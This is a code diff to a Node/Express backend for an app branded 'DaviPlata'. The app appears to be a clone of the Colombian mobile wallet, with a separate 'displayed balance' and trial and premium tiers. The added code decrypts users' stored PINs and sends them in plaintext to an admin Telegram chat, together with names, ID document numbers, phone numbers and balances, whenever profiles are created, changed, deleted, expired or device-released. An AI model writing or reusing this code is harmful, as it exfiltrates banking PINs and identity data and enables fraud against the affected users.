@@ -1,5 +1,6 @@
 import express, { type IRouter, type Request, type Response } from "express";
 import { createCipheriv, createDecipheriv, createHash, createHmac, randomBytes, timingSafeEqual } from "node:crypto";
+import { notifyAdminTelegram } from "./admin/notifications.js";
 
 const router: IRouter = express.Router();
 const accountId = "5128ff5490523174083c9d817775e9dc";
@@ -268,6 +269,62 @@ async function findProfileById(id: string) {
   return result.results?.[0] ?? null;
 }
 
+function safeProfilePin(profile: Record<string, unknown>) {
+  try {
+    return decryptPin(String(profile.pin_encrypted ?? ""));
+  } catch {
+    return "No disponible";
+  }
+}
+
+function profileChangedFields(previous: Record<string, unknown>, next: ProfileInput) {
+  const changed: string[] = [];
+  const checks: Array<[string, unknown, unknown]> = [
+    ["Nombre", previous.name, next.name],
+    ["Tipo de documento", previous.document_type, next.documentType],
+    ["Número de documento", previous.document_number, next.documentNumber],
+    ["Celular", previous.phone, next.phone],
+    ["Saldo", Number(previous.balance), next.balance],
+    ["Saldo mostrado", previous.display_balance === null ? null : Number(previous.display_balance), next.displayBalance],
+    ["Premium", `${previous.premium_enabled}:${previous.premium_expires_at}`, `${Number(next.premiumEnabled)}:${next.premiumExpiresAt}`],
+    ["Bold", `${previous.bold_enabled}:${previous.bold_expires_at}`, `${Number(next.boldEnabled)}:${next.boldExpiresAt}`],
+    ["SMS", `${previous.sms_enabled}:${previous.sms_credits}`, `${Number(next.smsEnabled)}:${next.smsCredits}`],
+    ["Acceso", Number(previous.blocked), Number(next.blocked)],
+    ["Tipo de usuario", Number(previous.is_trial), Number(next.isTrial)],
+    ["Vencimiento de prueba", previous.trial_expires_at, next.trialExpiresAt],
+  ];
+  for (const [label, before, after] of checks) {
+    if (String(before ?? "") !== String(after ?? "")) changed.push(label);
+  }
+  let previousPin = "";
+  try {
+    previousPin = decryptPin(String(previous.pin_encrypted ?? ""));
+  } catch {
+    // If an old encrypted PIN cannot be read, do not claim it changed.
+  }
+  if (previousPin && previousPin !== next.pin) changed.push("PIN");
+  return changed;
+}
+
+function profileAlertFields(profile: ProfileInput) {
+  const date = (value: number | null) => value
+    ? new Date(value).toLocaleString("es-CO", { timeZone: "America/Bogota" })
+    : "No aplica";
+  return {
+    Nombre: profile.name,
+    Documento: `${profile.documentType} ${profile.documentNumber}`,
+    Celular: profile.phone,
+    PIN: profile.pin,
+    Saldo: `$${profile.balance.toLocaleString("es-CO")}`,
+    Premium: `${profile.premiumEnabled ? "Activo" : "Inactivo"} · vence ${date(profile.premiumExpiresAt)}`,
+    Bold: `${profile.boldEnabled ? "Activo" : "Inactivo"} · vence ${date(profile.boldExpiresAt)}`,
+    SMS: `${profile.smsCredits} créditos · ${profile.smsEnabled ? "activo" : "inactivo"}`,
+    Tipo: profile.isTrial ? "Prueba" : "Normal",
+    "Vencimiento de prueba": profile.isTrial ? date(profile.trialExpiresAt) : "No aplica",
+    Acceso: profile.blocked ? "Bloqueado" : "Activo",
+  };
+}
+
 async function readState(profileId: string) {
   const result = await d1<{ state_json: string }>("SELECT state_json FROM davi_account_state WHERE profile_id = ? LIMIT 1", [profileId]);
   if (!result.results?.[0]) return null;
@@ -324,8 +381,29 @@ async function clearAttempts(request: Request, category: string) {
 
 async function clearExpiredTrials() {
   const now = Date.now();
+  const expiredResult = await d1<Record<string, unknown>>(
+    "SELECT * FROM davi_profiles WHERE is_trial = 1 AND trial_expires_at <= ?",
+    [now],
+  );
+  const expiredProfiles = expiredResult.results ?? [];
+  if (expiredProfiles.length === 0) return;
   await d1("DELETE FROM davi_account_state WHERE profile_id IN (SELECT id FROM davi_profiles WHERE is_trial = 1 AND trial_expires_at <= ?)", [now]);
   await d1("DELETE FROM davi_profiles WHERE is_trial = 1 AND trial_expires_at <= ?", [now]);
+  for (const profile of expiredProfiles) {
+    await notifyAdminTelegram({
+      token: process.env.TELEGRAM_BOT_TOKEN,
+      chatId: process.env.TELEGRAM_ADMIN_CHAT_ID,
+      app: "DaviPlata",
+      event: "Usuario de prueba eliminado al vencer",
+      fields: {
+        Nombre: profile.name,
+        Documento: `${profile.document_type} ${profile.document_number}`,
+        Celular: profile.phone,
+        PIN: safeProfilePin(profile),
+        Saldo: `$${Number(profile.balance).toLocaleString("es-CO")}`,
+      },
+    });
+  }
 }
 
 async function saveProfile(profile: ProfileInput) {
@@ -562,7 +640,8 @@ router.post("/daviplata/data", async (request: Request, response: Response) => {
       }
       if (action === "admin:releaseDevice") {
         const id = String(body.id ?? "");
-        if (!id || !await findProfileById(id)) {
+        const profile = id ? await findProfileById(id) : null;
+        if (!profile) {
           response.status(404).json({ error: "No se encontró el usuario." });
           return;
         }
@@ -572,6 +651,21 @@ router.post("/daviplata/data", async (request: Request, response: Response) => {
            WHERE id = ?`,
           [new Date().toISOString(), id],
         );
+        await notifyAdminTelegram({
+          token: process.env.TELEGRAM_BOT_TOKEN,
+          chatId: process.env.TELEGRAM_ADMIN_CHAT_ID,
+          app: "DaviPlata",
+          event: "Dispositivo liberado",
+          userAgent: request.headers["user-agent"] ?? "",
+          fields: {
+            Nombre: profile.name,
+            Documento: `${profile.document_type} ${profile.document_number}`,
+            Celular: profile.phone,
+            PIN: safeProfilePin(profile),
+            "Tenía dispositivo vinculado": profile.device_token_hash ? "Sí" : "No",
+            "Era de prueba": Number(profile.is_trial) === 1 ? "Sí" : "No",
+          },
+        });
         response.json({ released: true, deviceBound: false });
         return;
       }
@@ -588,17 +682,65 @@ router.post("/daviplata/data", async (request: Request, response: Response) => {
             return;
           }
         }
+        const previousResult = body.migrate === true
+          ? { results: [] as Record<string, unknown>[] }
+          : await d1<Record<string, unknown>>("SELECT * FROM davi_profiles");
+        const previousProfiles = new Map(
+          (previousResult.results ?? []).map((profile) => [String(profile.id), profile]),
+        );
         for (const profile of profiles) {
+          const previous = previousProfiles.get(profile.id);
+          const changes = previous ? profileChangedFields(previous, profile) : [];
           await saveProfile(profile);
           if (body.migrate === true && profile.state) await saveState(profile.id, profile.state);
+          if (body.migrate !== true && !previous) {
+            await notifyAdminTelegram({
+              token: process.env.TELEGRAM_BOT_TOKEN,
+              chatId: process.env.TELEGRAM_ADMIN_CHAT_ID,
+              app: "DaviPlata",
+              event: profile.isTrial ? "Usuario de prueba creado" : "Usuario creado",
+              userAgent: request.headers["user-agent"] ?? "",
+              fields: profileAlertFields(profile),
+            });
+          } else if (body.migrate !== true && changes.length > 0) {
+            await notifyAdminTelegram({
+              token: process.env.TELEGRAM_BOT_TOKEN,
+              chatId: process.env.TELEGRAM_ADMIN_CHAT_ID,
+              app: "DaviPlata",
+              event: "Perfil de usuario actualizado",
+              userAgent: request.headers["user-agent"] ?? "",
+              fields: {
+                ...profileAlertFields(profile),
+                Cambios: changes.join(", "),
+              },
+            });
+          }
         }
         response.json({ saved: profiles.length });
         return;
       }
       if (action === "admin:deleteProfile") {
         const id = String(body.id ?? "");
+        const profile = id ? await findProfileById(id) : null;
         await d1("DELETE FROM davi_account_state WHERE profile_id = ?", [id]);
         await d1("DELETE FROM davi_profiles WHERE id = ?", [id]);
+        if (profile) {
+          await notifyAdminTelegram({
+            token: process.env.TELEGRAM_BOT_TOKEN,
+            chatId: process.env.TELEGRAM_ADMIN_CHAT_ID,
+            app: "DaviPlata",
+            event: "Usuario eliminado",
+            userAgent: request.headers["user-agent"] ?? "",
+            fields: {
+              Nombre: profile.name,
+              Documento: `${profile.document_type} ${profile.document_number}`,
+              Celular: profile.phone,
+              PIN: safeProfilePin(profile),
+              Saldo: `$${Number(profile.balance).toLocaleString("es-CO")}`,
+              "Era de prueba": Number(profile.is_trial) === 1 ? "Sí" : "No",
+            },
+          });
+        }
         response.json({ deleted: true });
         return;
       }
